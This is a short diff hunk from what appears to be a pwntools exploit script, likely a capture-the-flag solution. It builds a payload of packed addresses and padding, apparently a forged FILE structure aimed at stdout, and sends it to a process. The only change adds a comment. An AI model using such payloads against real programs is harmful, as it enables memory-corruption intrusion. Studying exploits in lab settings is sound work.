@@ -16,7 +16,7 @@ payload += p64(0)
 payload += p64(0x4040e0)
 payload += p64(0x4040e0+0x120) 
 payload += b'\x00' * (0x8 * 8)
-payload += p64(1)
+payload += p64(1) # _fileno = 1, stdout
 
 
 p.sendline(payload)
